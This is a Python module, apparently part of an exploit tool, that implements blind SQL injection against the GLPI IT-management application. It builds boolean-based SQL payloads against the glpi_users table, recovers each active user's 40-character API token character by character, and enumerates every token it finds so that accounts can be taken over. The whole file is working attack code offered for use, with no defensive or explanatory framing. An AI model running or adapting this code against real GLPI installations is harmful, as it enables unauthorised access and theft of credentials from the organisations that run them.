import string
from abc import ABC, abstractmethod
from .logger import Log

class SqlInjectionMixin(ABC):
    """
    Class helping for sql injection on glpi
    for boolean / time based SQLi
    """
    concat_id_char = string.digits + ','
    token_chars = string.digits + string.ascii_letters # Used by glpi for token generation
    separator = ',' # Th group_concat separator

    @abstractmethod
    def send_payload(self, payload):
        """
        Send the payload

        :param payload: The payload sql to send
        :type payload: str
        """
        raise NotImplementedError

    @abstractmethod
    def check_result(self, res):
        """
        Check if the payload worked given a result

        :return: The result of the injection
        :rtype: bool
        """
        raise NotImplementedError

    def payload_exists(self, payload):
        """
        Check if the payload have a result
        
        :return: Whether or not there are available api token in db
        :rtype: bool
        """
        payload = f"({payload}) IS NOT NULL"
        return self.check_result(self.send_payload(payload))

    def get_api_token(self, pos):
        """
        Get the api token at the position pos
        """
        payload = f"SELECT MID(api_token, $index$, 1) = BINARY \"$char$\" FROM glpi_users WHERE api_token is not NULL and is_active=1 and is_deleted=0 LIMIT 1 OFFSET {pos}"
        current_api_token = ""
        for index in range(1, 41):
            for char in self.token_chars:
                Log.log(f"API Token: [blue]{current_api_token}[/blue][red]{char}[/red]   ", end="\r")
                res = self.send_payload(
                            payload.replace("$char$", char).replace("$index$", str(index))
                        )
                if self.check_result(res):
                    current_api_token += char
                    break

                if char == self.token_chars[-1]:
                    # Problem, we could not find a valid value
                    Log.err(f"Problem, could not recover character, check through a proxy")
                    return None
        print()
        return current_api_token

    def enum_api_token_available(self):
        """
        Enum the api token in the databases

        :return: The list containing all the api tokens recovered
        :rtype: List[str]
        """
        index = 0
        current_api_token = []
        while True:
            payload = f"SELECT api_token FROM glpi_users WHERE api_token is not NULL and is_active=1 and is_deleted=0 LIMIT 1 OFFSET {index}"
            if self.payload_exists(payload):
                Log.msg(f"Api token found in DB, you might get an [b]account[/b] !!")
                current_api_token.append(self.get_api_token(index))
                index += 1

            else:
                break
        return current_api_token
